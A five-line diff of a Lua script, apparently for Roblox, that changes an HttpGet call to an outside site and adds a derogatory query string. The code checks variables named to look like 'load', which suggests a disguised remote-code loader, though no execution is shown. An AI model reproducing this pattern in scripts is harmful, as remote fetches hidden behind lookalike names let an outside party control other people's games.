@@ -1,5 +1,5 @@
 -- by ghost player
-local website = game:HttpGet("http://zte.ct.ws/")
+local website = game:HttpGet("http://zte.ct.ws/?=youaregay")
 
 if Ioad == nil or IoadClone == nil then
    Ioad = nil
